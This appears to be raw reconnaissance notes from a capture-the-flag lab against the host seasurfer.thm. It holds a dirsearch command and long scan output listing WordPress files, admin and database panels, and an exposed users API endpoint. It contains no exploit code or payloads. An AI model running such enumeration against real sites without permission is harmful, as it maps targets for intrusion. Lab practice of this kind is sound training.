[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/ms-functions.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/ms-settings.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/ms-load.php
[00:11:32] 200 -   29B  - http://seasurfer.thm/wp-includes/ms-files.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/nav-menu.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/nav-menu-template.php
[00:11:32] 200 -  361KB - http://seasurfer.thm/wp-includes/js/tinymce/wp-tinymce.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/pluggable-deprecated.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/pomo/entry.php
[00:11:32] 403 -  278B  - http://seasurfer.thm/wp-includes/pomo/
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/pomo/mo.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/pluggable.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/post.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/post-thumbnail-template.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/plugin.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/query.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/pomo/po.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/rewrite.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/rss-functions.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/post-template.php
00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/rss.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/shortcodes.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/script-loader.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/pomo/streams.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/registration.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/pomo/translations.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/template-loader.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/registration-functions.php
[00:11:32] 403 -  278B  - http://seasurfer.thm/wp-includes/Text/
[00:11:32] 403 -  278B  - http://seasurfer.thm/wp-includes/Text/Diff/
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/Text/Diff/Engine/native.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/taxonomy.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/Text/Diff/Engine/shell.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/Text/Diff/Engine/xdiff.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/Text/Diff/Engine/string.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/Text/Diff.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/Text/Diff/Renderer/inline.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/theme-compat/comments.php
[00:11:32] 403 -  278B  - http://seasurfer.thm/wp-includes/theme-compat/
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/theme-compat/footer.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/theme-compat/header.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/theme.php
[00:11:32] 403 -  278B  - http://seasurfer.thm/wp-includes/Text/Diff/Engine/
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/Text/Diff/Renderer.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/update.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/user.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/widgets.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/version.php
[00:11:32] 403 -  278B  - http://seasurfer.thm/wp-includes/Text/Diff/Renderer/
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/theme-compat/sidebar.php
[00:11:32] 200 -  460B  - http://seasurfer.thm/wp-includes/wlwmanifest.xml
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/wp-diff.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/vars.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/wp-db.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-settings.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-load.php
[00:11:32] 403 -    3KB - http://seasurfer.thm/wp-mail.php
[00:11:32] 200 -  184B  - http://seasurfer.thm/wp-links-opml.php
[00:11:32] 200 -  575B  - http://seasurfer.thm/wp-json/wp/v2/users
[00:11:32] 200 -    2KB - http://seasurfer.thm/wp-login.php
[00:11:32] 200 -  156KB - http://seasurfer.thm/wp-json/
[00:11:32] 200 -    6KB - http://seasurfer.thm/wp-json/wp/v2/posts

Task Completed
```

seasurfer.thm/adminer/
seasurfer.thm/adminer/index.php/
seasurfer.thm/blog/
seasurfer.thm/favicon.ico
seasurfer.thm/license.txt
seasurfer.thm/readme.html
seasurfer.thm/robots.txt
seasurfer.thm/wp-admin/install.php
seasurfer.thm/wp-config.php
seasurfer.thm/wp-content/
seasurfer.thm/wp-includes/rss-functions.php
seasurfer.thm/wp-json/
seasurfer.thm/wp-cron.php
seasurfer.thm/wp-json/wp/v2/users/
seasurfer.thm/wp-login.php




http://seasurfer.thm/wp-login.php?redirect_to=http%3A%2F%2Fseasurfer.thm%2Fwp-admin%2F&reauth=1
http://seasurfer.thm/wp-login.php?action=register
http://seasurfer.thm/www/phpMyAdmin/
http://seasurfer.thm/xampp/phpmyadmin/
http://seasurfer.thm/sugarcrm/?module=Accounts&action=ShowDuplicates
http://seasurfer.thm//xmlrpc.php







seasurfer.thm/adm/
seasurfer.thm/admin/
seasurfer.thm/admin2/
seasurfer.thm/wp-admin/
seasurfer.thm/home/
seasurfer.thm/admin/mysql/
seasurfer.thm/admin/mysql2/
seasurfer.thm/admin/PMA/
seasurfer.thm/admin/phpmyadmin/
seasurfer.thm/admin/phpmyadmin2/
seasurfer.thm/admin_area/
seasurfer.thm/admincp/
seasurfer.thm/administrator/
seasurfer.thm/apc/
seasurfer.thm/asset/
seasurfer.thm/atom/
seasurfer.thm/axis/happyaxis.jsp
seasurfer.thm/axis2-web/HappyAxis.jsp
seasurfer.thm/bb-admin/
seasurfer.thm/bitrix/admin/
seasurfer.thm/bitrix/contact/
seasurfer.thm/Citrix/AccessPlatform/auth/clientscripts/cookies.js
seasurfer.thm/claroline/phpMyAdmin/
seasurfer.thm/db/
seasurfer.thm/dbamin/
seasurfer.thm/engine/classes/swfupload/swfupload_f9.swf
seasurfer.thm/engine/classes/swfupload/swfupload.swf
seasurfer.thm/etc/lib/pChart2/examples/imageMap/
seasurfer.thm/extjs/resources/charts.swf
seasurfer.thm/feed/
seasurfer.thm/html/js/misc/swfupload/swfupload.swf
seasurfer.thm/login/
seasurfer.thm/install/?upgrade/
seasurfer.thm/jkstatus
seasurfer.thm/login.wdm
seasurfer.thm/wp-login.php
seasurfer.thm/modelsearch/
seasurfer.thm/myadmin/index.php
seasurfer.thm/myadmin2/index.php
seasurfer.thm/mysql/index.php
seasurfer.thm/mysqladmin/index.php
seasurfer.thm/new-website-is-up/
seasurfer.thm/New%20folder%20(2
seasurfer.thm/news/
seasurfer.thm/panel-administracion/index.php
seasurfer.thm/phpadmin/index.php
seasurfer.thm/phpMyAdmin.old/index.php
seasurfer.thm/phpmyadmin.old/index.php
seasurfer.thm/phpmyadmin/index.php
seasurfer.thm/phpMyAdmin/index.php
seasurfer.thm/phpMyAdmin/phpMyAdmin/index.php
...












```bash
:~/SeaSurfer# dirsearch -u http://seasurfer.thm/ -r -x 401,402,403,404

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/SeaSurfer/reports/http_seasurfer.thm/__25-09-28_xx-xxxx.txt

Target: http://seasurfer.thm/

[xx:xx:xx] Starting: 
[xx:xx:xx] 301 -    0B  - /%2e%2e//google.com  ->  http://seasurfer.thm/%2E%2E/google.com
[xx:xx:xx] 301 -    0B  - /0  ->  http://seasurfer.thm/
[xx:xx:xx] 301 -    0B  - /a  ->  http://seasurfer.thm/
[xx:xx:xx] 301 -    0B  - /A  ->  http://seasurfer.thm/
[xx:xx:xx] 301 -    0B  - /About  ->  http://seasurfer.thm/
[xx:xx:xx] 301 -    0B  - /ab/  ->  http://seasurfer.thm/
[xx:xx:xx] 301 -    0B  - /about  ->  http://seasurfer.thm/
[xx:xx:xx] 301 -    0B  - /adm/index.php  ->  http://seasurfer.thm/adm/
[xx:xx:xx] 302 -    0B  - /admin  ->  http://seasurfer.thm/wp-admin/
[xx:xx:xx] 301 -    0B  - /admin.  ->  http://seasurfer.thm/admin
[xx:xx:xx] 302 -    0B  - /admin/  ->  http://seasurfer.thm/wp-admin/
[xx:xx:xx] 301 -    0B  - /admin/home  ->  http://seasurfer.thm/home/
[xx:xx:xx] 301 -    0B  - /admin/index.php  ->  http://seasurfer.thm/admin/
[xx:xx:xx] 301 -    0B  - /admin/mysql2/index.php  ->  http://seasurfer.thm/admin/mysql2/
[xx:xx:xx] 301 -    0B  - /admin/mysql/index.php  ->  http://seasurfer.thm/admin/mysql/
[xx:xx:xx] 301 -    0B  - /admin/PMA/index.php  ->  http://seasurfer.thm/admin/PMA/
[xx:xx:xx] 301 -    0B  - /admin/phpmyadmin/index.php  ->  http://seasurfer.thm/admin/phpmyadmin/
[xx:xx:xx] 301 -    0B  - /admin/phpMyAdmin/index.php  ->  http://seasurfer.thm/admin/phpMyAdmin/
[xx:xx:xx] 301 -    0B  - /admin/phpmyadmin2/index.php  ->  http://seasurfer.thm/admin/phpmyadmin2/
[xx:xx:xx] 301 -    0B  - /admin/pma/index.php  ->  http://seasurfer.thm/admin/pma/
[xx:xx:xx] 301 -    0B  - /admin2/index.php  ->  http://seasurfer.thm/admin2/
[xx:xx:xx] 301 -    0B  - /admin_area/index.php  ->  http://seasurfer.thm/admin_area/
[xx:xx:xx] 301 -    0B  - /adminarea/index.php  ->  http://seasurfer.thm/adminarea/
[xx:xx:xx] 301 -    0B  - /admincp/index.php  ->  http://seasurfer.thm/admincp/
[xx:xx:xx] 200 -    2KB - /adminer/index.php
[xx:xx:xx] 200 -    2KB - /adminer/
Added to the queue: adminer/
[xx:xx:xx] 301 -    0B  - /administrator/index.php  ->  http://seasurfer.thm/administrator/
[xx:xx:xx] 301 -    0B  - /apc/index.php  ->  http://seasurfer.thm/apc/
[xx:xx:xx] 301 -    0B  - /asset..  ->  http://seasurfer.thm/asset
[xx:xx:xx] 301 -    0B  - /atom  ->  http://seasurfer.thm/feed/atom/
[xx:xx:xx] 301 -    0B  - /axis//happyaxis.jsp  ->  http://seasurfer.thm/axis/happyaxis.jsp
[xx:xx:xx] 301 -    0B  - /axis2-web//HappyAxis.jsp  ->  http://seasurfer.thm/axis2-web/HappyAxis.jsp
[xx:xx:xx] 301 -    0B  - /axis2//axis2-web/HappyAxis.jsp  ->  http://seasurfer.thm/axis2/axis2-web/HappyAxis.jsp
[xx:xx:xx] 301 -    0B  - /b  ->  http://seasurfer.thm/blog/
[xx:xx:xx] 301 -    0B  - /bb-admin/index.php  ->  http://seasurfer.thm/bb-admin/
[xx:xx:xx] 301 -    0B  - /bitrix/admin/index.php  ->  http://seasurfer.thm/bitrix/admin/
[xx:xx:xx] 301 -    0B  - /blog  ->  http://seasurfer.thm/blog/
Added to the queue: blog/
[xx:xx:xx] 200 -   22KB - /blog/
[xx:xx:xx] 301 -    0B  - /c  ->  http://seasurfer.thm/contact/
[xx:xx:xx] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  http://seasurfer.thm/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[xx:xx:xx] 301 -    0B  - /claroline/phpMyAdmin/index.php  ->  http://seasurfer.thm/claroline/phpMyAdmin/
[23:09:45] 301 -    0B  - /contact  ->  http://seasurfer.thm/contact/
Added to the queue: contact/
[23:09:50] 302 -    0B  - /dashboard  ->  http://seasurfer.thm/wp-admin/
[23:09:50] 302 -    0B  - /dashboard/  ->  http://seasurfer.thm/wp-admin/
[23:09:51] 301 -    0B  - /db/index.php  ->  http://seasurfer.thm/db/
[23:09:52] 301 -    0B  - /dbadmin/index.php  ->  http://seasurfer.thm/dbadmin/
[23:10:00] 301 -    0B  - /engine/classes/swfupload//swfupload_f9.swf  ->  http://seasurfer.thm/engine/classes/swfupload/swfupload_f9.swf
[23:10:00] 301 -    0B  - /engine/classes/swfupload//swfupload.swf  ->  http://seasurfer.thm/engine/classes/swfupload/swfupload.swf
[23:10:02] 301 -    0B  - /etc/lib/pChart2/examples/imageMap/index.php  ->  http://seasurfer.thm/etc/lib/pChart2/examples/imageMap/
[23:10:04] 301 -    0B  - /extjs/resources//charts.swf  ->  http://seasurfer.thm/extjs/resources/charts.swf
[23:10:05] 200 -   15KB - /favicon.ico
[23:10:06] 301 -    0B  - /feed  ->  http://seasurfer.thm/feed/
Added to the queue: feed/
[23:10:14] 301 -    0B  - /h  ->  http://seasurfer.thm/home/
[23:10:15] 301 -    0B  - /home  ->  http://seasurfer.thm/home/
Added to the queue: home/
[23:10:16] 301 -    0B  - /html/js/misc/swfupload//swfupload.swf  ->  http://seasurfer.thm/html/js/misc/swfupload/swfupload.swf
[23:10:20] 301 -    0B  - /index.php  ->  http://seasurfer.thm/
[23:10:21] 301 -    0B  - /index.php/login/  ->  http://seasurfer.thm/login/
[23:10:23] 301 -    0B  - /install/index.php?upgrade/  ->  http://seasurfer.thm/install/?upgrade/
[23:10:25] 301 -    0B  - /jkstatus;  ->  http://seasurfer.thm/jkstatus
[23:10:30] 200 -    7KB - /license.txt
[23:10:33] 302 -    0B  - /login  ->  http://seasurfer.thm/wp-login.php
[23:10:33] 301 -    0B  - /login.wdm%20  ->  http://seasurfer.thm/login.wdm
[23:10:33] 302 -    0B  - /login/  ->  http://seasurfer.thm/wp-login.php
[23:10:33] 301 -    0B  - /login.wdm%2e  ->  http://seasurfer.thm/login.wdm
[23:10:43] 301 -    0B  - /modelsearch/index.php  ->  http://seasurfer.thm/modelsearch/
[23:10:46] 301 -    0B  - /myadmin/index.php  ->  http://seasurfer.thm/myadmin/
[23:10:46] 301 -    0B  - /myadmin2/index.php  ->  http://seasurfer.thm/myadmin2/
[23:10:46] 301 -    0B  - /mysql-admin/index.php  ->  http://seasurfer.thm/mysql-admin/
[23:10:46] 301 -    0B  - /mysql/index.php  ->  http://seasurfer.thm/mysql/
[23:10:46] 301 -    0B  - /mysqladmin/index.php  ->  http://seasurfer.thm/mysqladmin/
[23:10:47] 301 -    0B  - /n  ->  http://seasurfer.thm/new-website-is-up/
[23:10:47] 301 -    0B  - /New%20folder%20(2)  ->  http://seasurfer.thm/New%20folder%20(2
[23:10:47] 301 -    0B  - /new  ->  http://seasurfer.thm/new-website-is-up/
[23:10:48] 301 -    0B  - /news  ->  http://seasurfer.thm/news/
Added to the queue: news/
[23:10:54] 301 -    0B  - /panel-administracion/index.php  ->  http://seasurfer.thm/panel-administracion/
[23:10:58] 301 -    0B  - /phpadmin/index.php  ->  http://seasurfer.thm/phpadmin/
[23:10:58] 301 -    0B  - /phpma/index.php  ->  http://seasurfer.thm/phpma/
[23:10:59] 301 -    0B  - /phpmyadmin!!  ->  http://seasurfer.thm/phpmyadmin
[23:11:02] 301 -    0B  - /phpmyadmin-old/index.php  ->  http://seasurfer.thm/phpmyadmin-old/
[23:11:03] 301 -    0B  - /phpMyAdmin.old/index.php  ->  http://seasurfer.thm/phpMyAdmin.old/
[23:11:03] 301 -    0B  - /phpMyAdmin/index.php  ->  http://seasurfer.thm/phpMyAdmin/
[23:11:03] 301 -    0B  - /phpmyadmin/phpmyadmin/index.php  ->  http://seasurfer.thm/phpmyadmin/phpmyadmin/
[23:11:03] 301 -    0B  - /phpMyAdmin/phpMyAdmin/index.php  ->  http://seasurfer.thm/phpMyAdmin/phpMyAdmin/
[23:11:03] 301 -    0B  - /phpmyadmin/index.php  ->  http://seasurfer.thm/phpmyadmin/
[23:11:03] 301 -    0B  - /phpmyadmin0/index.php  ->  http://seasurfer.thm/phpmyadmin0/
[23:11:03] 301 -    0B  - /phpmyadmin1/index.php  ->  http://seasurfer.thm/phpmyadmin1/
[23:11:03] 301 -    0B  - /phpmyadmin2/index.php  ->  http://seasurfer.thm/phpmyadmin2/
[23:11:03] 301 -    0B  - /phpMyadmin_bak/index.php  ->  http://seasurfer.thm/phpMyadmin_bak/
[23:11:03] 301 -    0B  - /phpMyAdminold/index.php  ->  http://seasurfer.thm/phpMyAdminold/
[23:11:05] 301 -    0B  - /pma/index.php  ->  http://seasurfer.thm/pma/
[23:11:05] 301 -    0B  - /pma-old/index.php  ->  http://seasurfer.thm/pma-old/
[23:11:05] 301 -    0B  - /PMA2/index.php  ->  http://seasurfer.thm/PMA2/
[23:11:06] 301 -    0B  - /PMA/index.php  ->  http://seasurfer.thm/PMA/
[23:11:06] 301 -    0B  - /pmamy2/index.php  ->  http://seasurfer.thm/pmamy2/
[23:11:06] 301 -    0B  - /pmamy/index.php  ->  http://seasurfer.thm/pmamy/
[23:11:06] 301 -    0B  - /pmd/index.php  ->  http://seasurfer.thm/pmd/
[23:11:12] 301 -    0B  - /rating_over.  ->  http://seasurfer.thm/rating_over
[23:11:12] 200 -    3KB - /readme.html
[23:11:16] 200 -  109B  - /robots.txt
[23:11:16] 301 -    0B  - /roundcube/index.php  ->  http://seasurfer.thm/roundcube/
[23:11:16] 301 -    0B  - /rss  ->  http://seasurfer.thm/feed/
[23:11:17] 301 -    0B  - /s  ->  http://seasurfer.thm/sale/
[23:11:17] 301 -    0B  - /sample  ->  http://seasurfer.thm/sample-page/
[23:11:22] 301 -    0B  - /sessions/new  ->  http://seasurfer.thm/new-website-is-up/
[23:11:26] 301 -    0B  - /siteadmin/index.php  ->  http://seasurfer.thm/siteadmin/
[23:11:26] 302 -    0B  - /sitemap.xml  ->  http://seasurfer.thm/wp-sitemap.xml
[23:11:29] 301 -    0B  - /sql/index.php  ->  http://seasurfer.thm/sql/
[23:11:31] 301 -    0B  - /static..  ->  http://seasurfer.thm/static
[23:11:33] 301 -    0B  - /sugarcrm/index.php?module=Contacts&action=ShowDuplicates  ->  http://seasurfer.thm/sugarcrm/?module=Contacts&action=ShowDuplicates
[23:11:34] 301 -    0B  - /sugarcrm/index.php?module=Accounts&action=ShowDuplicates  ->  http://seasurfer.thm/sugarcrm/?module=Accounts&action=ShowDuplicates
[23:11:39] 301 -    0B  - /templates/ja-helio-farsi/index.php  ->  http://seasurfer.thm/templates/ja-helio-farsi/
[23:11:39] 301 -    0B  - /templates/beez/index.php  ->  http://seasurfer.thm/templates/beez/
[23:11:39] 301 -    0B  - /templates/rhuk_milkyway/index.php  ->  http://seasurfer.thm/templates/rhuk_milkyway/
[23:11:42] 301 -    0B  - /tmp/index.php  ->  http://seasurfer.thm/tmp/
[23:11:43] 301 -    0B  - /tools/phpMyAdmin/index.php  ->  http://seasurfer.thm/tools/phpMyAdmin/
[23:11:44] 301 -    0B  - /typo3/phpmyadmin/index.php  ->  http://seasurfer.thm/typo3/phpmyadmin/
[23:11:57] 301 -    0B  - /web/phpMyAdmin/index.php  ->  http://seasurfer.thm/web/phpMyAdmin/
[23:11:57] 301 -    0B  - /webadmin/index.php  ->  http://seasurfer.thm/webadmin/
[23:12:00] 301 -  317B  - /wp-admin  ->  http://seasurfer.thm/wp-admin/
Added to the queue: wp-admin/
[23:12:00] 400 -    1B  - /wp-admin/admin-ajax.php
[23:12:00] 409 -    3KB - /wp-admin/setup-config.php
[23:12:00] 200 -  509B  - /wp-admin/install.php
[23:12:00] 302 -    0B  - /wp-admin/  ->  http://seasurfer.thm/wp-login.php?redirect_to=http%3A%2F%2Fseasurfer.thm%2Fwp-admin%2F&reauth=1
[23:12:00] 200 -    0B  - /wp-config.php
[23:12:01] 301 -  319B  - /wp-content  ->  http://seasurfer.thm/wp-content/
Added to the queue: wp-content/
[23:12:01] 200 -    0B  - /wp-content/
[23:12:01] 301 -    0B  - /wp-content/plugins/adminer/inc/editor/index.php  ->  http://seasurfer.thm/wp-content/plugins/adminer/inc/editor/
[23:12:02] 500 -    0B  - /wp-content/plugins/hello.php
[23:12:02] 200 -    0B  - /wp-includes/rss-functions.php
[23:12:02] 301 -  320B  - /wp-includes  ->  http://seasurfer.thm/wp-includes/
Added to the queue: wp-includes/
[23:12:02] 200 -    0B  - /wp-cron.php
[23:12:02] 200 -    2KB - /wp-login.php
[23:12:02] 200 -  575B  - /wp-json/wp/v2/users/
Added to the queue: wp-json/wp/v2/users/
[23:12:02] 301 -    0B  - /wp-register.php  ->  http://seasurfer.thm/wp-login.php?action=register
[23:12:02] 200 -  156KB - /wp-json/
Added to the queue: wp-json/
[23:12:02] 302 -    0B  - /wp-signup.php  ->  http://seasurfer.thm/wp-login.php?action=register
[23:12:03] 301 -    0B  - /www/phpMyAdmin/index.php  ->  http://seasurfer.thm/www/phpMyAdmin/
[23:12:04] 301 -    0B  - /xampp/phpmyadmin/index.php  ->  http://seasurfer.thm/xampp/phpmyadmin/
[23:12:05] 405 -   42B  - /xmlrpc.php
[23:12:06] 301 -    0B  - /~news  ->  http://seasurfer.thm/~news/
Added to the queue: ~news/

[23:12:06] Starting: adminer/
[23:12:07] 301 -    0B  - /adminer/%2e%2e//google.com  ->  http://seasurfer.thm/adminer/%2E%2E/google.com
[23:12:46] 301 -    0B  - /adminer/A  ->  http://seasurfer.thm/
[23:12:46] 301 -    0B  - /adminer/a  ->  http://seasurfer.thm/
[23:12:47] 301 -    0B  - /adminer/ab/  ->  http://seasurfer.thm/
[23:12:47] 301 -    0B  - /adminer/About  ->  http://seasurfer.thm/
[23:12:47] 301 -    0B  - /adminer/about  ->  http://seasurfer.thm/
[23:12:55] 301 -    0B  - /adminer/adm/index.php  ->  http://seasurfer.thm/adminer/adm/
[23:12:57] 301 -    0B  - /adminer/admin.  ->  http://seasurfer.thm/adminer/admin
[23:13:00] 301 -    0B  - /adminer/admin/index.php  ->  http://seasurfer.thm/adminer/admin/
[23:13:01] 301 -    0B  - /adminer/admin/phpmyadmin2/index.php  ->  http://seasurfer.thm/adminer/admin/phpmyadmin2/
[23:13:01] 301 -    0B  - /adminer/admin/PMA/index.php  ->  http://seasurfer.thm/adminer/admin/PMA/
[23:13:01] 301 -    0B  - /adminer/admin/mysql2/index.php  ->  http://seasurfer.thm/adminer/admin/mysql2/
[23:13:01] 301 -    0B  - /adminer/admin/phpMyAdmin/index.php  ->  http://seasurfer.thm/adminer/admin/phpMyAdmin/
[23:13:01] 301 -    0B  - /adminer/admin/mysql/index.php  ->  http://seasurfer.thm/adminer/admin/mysql/
[23:13:01] 301 -    0B  - /adminer/admin/phpmyadmin/index.php  ->  http://seasurfer.thm/adminer/admin/phpmyadmin/
[23:13:01] 301 -    0B  - /adminer/admin/pma/index.php  ->  http://seasurfer.thm/adminer/admin/pma/
[23:13:02] 301 -    0B  - /adminer/admin2/index.php  ->  http://seasurfer.thm/adminer/admin2/
[23:13:04] 301 -    0B  - /adminer/admin_area/index.php  ->  http://seasurfer.thm/adminer/admin_area/
[23:13:16] 301 -    0B  - /adminer/adminarea/index.php  ->  http://seasurfer.thm/adminer/adminarea/
[23:13:18] 301 -    0B  - /adminer/admincp/index.php  ->  http://seasurfer.thm/adminer/admincp/
[23:13:19] 301 -    0B  - /adminer/adminer/index.php  ->  http://seasurfer.thm/adminer/adminer/
[23:13:22] 301 -    0B  - /adminer/administrator/index.php  ->  http://seasurfer.thm/adminer/administrator/
[23:13:30] 301 -    0B  - /adminer/apc/index.php  ->  http://seasurfer.thm/adminer/apc/
[23:13:35] 301 -    0B  - /adminer/asset..  ->  http://seasurfer.thm/adminer/asset
[23:13:35] 301 -    0B  - /adminer/atom  ->  http://seasurfer.thm/adminer/feed/atom/
[23:13:37] 301 -    0B  - /adminer/axis//happyaxis.jsp  ->  http://seasurfer.thm/adminer/axis/happyaxis.jsp
[23:13:37] 301 -    0B  - /adminer/axis2-web//HappyAxis.jsp  ->  http://seasurfer.thm/adminer/axis2-web/HappyAxis.jsp
[23:13:37] 301 -    0B  - /adminer/axis2//axis2-web/HappyAxis.jsp  ->  http://seasurfer.thm/adminer/axis2/axis2-web/HappyAxis.jsp
[23:13:37] 301 -    0B  - /adminer/b  ->  http://seasurfer.thm/blog/
[23:13:39] 301 -    0B  - /adminer/bb-admin/index.php  ->  http://seasurfer.thm/adminer/bb-admin/
[23:13:41] 301 -    0B  - /adminer/bitrix/admin/index.php  ->  http://seasurfer.thm/adminer/bitrix/admin/
[23:13:43] 301 -    0B  - /adminer/blog  ->  http://seasurfer.thm/blog/
[23:13:43] 301 -    0B  - /adminer/blog/  ->  http://seasurfer.thm/blog/
[23:13:45] 301 -    0B  - /adminer/c  ->  http://seasurfer.thm/contact/
[23:13:49] 301 -    0B  - /adminer/Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  http://seasurfer.thm/adminer/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[23:13:50] 301 -    0B  - /adminer/claroline/phpMyAdmin/index.php  ->  http://seasurfer.thm/adminer/claroline/phpMyAdmin/
[23:14:03] 301 -    0B  - /adminer/contact  ->  http://seasurfer.thm/contact/
[23:14:11] 301 -    0B  - /adminer/db/index.php  ->  http://seasurfer.thm/adminer/db/
[23:14:12] 301 -    0B  - /adminer/dbadmin/index.php  ->  http://seasurfer.thm/adminer/dbadmin/
[23:14:20] 301 -    0B  - /adminer/engine/classes/swfupload//swfupload_f9.swf  ->  http://seasurfer.thm/adminer/engine/classes/swfupload/swfupload_f9.swf
[23:14:20] 301 -    0B  - /adminer/engine/classes/swfupload//swfupload.swf  ->  http://seasurfer.thm/adminer/engine/classes/swfupload/swfupload.swf
[23:14:22] 301 -    0B  - /adminer/etc/lib/pChart2/examples/imageMap/index.php  ->  http://seasurfer.thm/adminer/etc/lib/pChart2/examples/imageMap/
[23:14:24] 301 -    0B  - /adminer/extjs/resources//charts.swf  ->  http://seasurfer.thm/adminer/extjs/resources/charts.swf
[23:14:25] 301 -    0B  - /adminer/feed  ->  http://seasurfer.thm/adminer/feed/
Added to the queue: adminer/feed/
[23:14:33] 301 -    0B  - /adminer/h  ->  http://seasurfer.thm/home/
[23:14:35] 301 -    0B  - /adminer/home  ->  http://seasurfer.thm/home/
[23:14:36] 301 -    0B  - /adminer/html/js/misc/swfupload//swfupload.swf  ->  http://seasurfer.thm/adminer/html/js/misc/swfupload/swfupload.swf
[23:14:42] 301 -    0B  - /adminer/install/index.php?upgrade/  ->  http://seasurfer.thm/adminer/install/?upgrade/
[23:14:45] 301 -    0B  - /adminer/jkstatus;  ->  http://seasurfer.thm/adminer/jkstatus
[23:14:53] 301 -    0B  - /adminer/login.wdm%20  ->  http://seasurfer.thm/adminer/login.wdm
[23:14:53] 301 -    0B  - /adminer/login.wdm%2e  ->  http://seasurfer.thm/adminer/login.wdm
[23:15:03] 301 -    0B  - /adminer/modelsearch/index.php  ->  http://seasurfer.thm/adminer/modelsearch/
[23:15:06] 301 -    0B  - /adminer/myadmin/index.php  ->  http://seasurfer.thm/adminer/myadmin/
[23:15:06] 301 -    0B  - /adminer/myadmin2/index.php  ->  http://seasurfer.thm/adminer/myadmin2/
[23:15:06] 301 -    0B  - /adminer/mysql-admin/index.php  ->  http://seasurfer.thm/adminer/mysql-admin/
[23:15:06] 301 -    0B  - /adminer/mysql/index.php  ->  http://seasurfer.thm/adminer/mysql/
[23:15:07] 301 -    0B  - /adminer/n  ->  http://seasurfer.thm/new-website-is-up/
[23:15:07] 301 -    0B  - /adminer/mysqladmin/index.php  ->  http://seasurfer.thm/adminer/mysqladmin/
[23:15:07] 301 -    0B  - /adminer/new  ->  http://seasurfer.thm/new-website-is-up/
[23:15:07] 301 -    0B  - /adminer/New%20folder%20(2)  ->  http://seasurfer.thm/adminer/New%20folder%20(2
[23:15:08] 301 -    0B  - /adminer/news  ->  http://seasurfer.thm/news/
[23:15:14] 301 -    0B  - /adminer/panel-administracion/index.php  ->  http://seasurfer.thm/adminer/panel-administracion/
[23:15:18] 301 -    0B  - /adminer/phpadmin/index.php  ->  http://seasurfer.thm/adminer/phpadmin/
[23:15:19] 301 -    0B  - /adminer/phpma/index.php  ->  http://seasurfer.thm/adminer/phpma/
[23:15:19] 301 -    0B  - /adminer/phpmyadmin!!  ->  http://seasurfer.thm/adminer/phpmyadmin
[23:15:24] 301 -    0B  - /adminer/phpmyadmin-old/index.php  ->  http://seasurfer.thm/adminer/phpmyadmin-old/
[23:15:24] 301 -    0B  - /adminer/phpMyAdmin.old/index.php  ->  http://seasurfer.thm/adminer/phpMyAdmin.old/
[23:15:25] 301 -    0B  - /adminer/phpMyAdmin/index.php  ->  http://seasurfer.thm/adminer/phpMyAdmin/
[23:15:25] 301 -    0B  - /adminer/phpmyadmin/phpmyadmin/index.php  ->  http://seasurfer.thm/adminer/phpmyadmin/phpmyadmin/
[23:15:25] 301 -    0B  - /adminer/phpmyadmin/index.php  ->  http://seasurfer.thm/adminer/phpmyadmin/
[23:15:25] 301 -    0B  - /adminer/phpMyAdmin/phpMyAdmin/index.php  ->  http://seasurfer.thm/adminer/phpMyAdmin/phpMyAdmin/
[23:15:25] 301 -    0B  - /adminer/phpmyadmin0/index.php  ->  http://seasurfer.thm/adminer/phpmyadmin0/
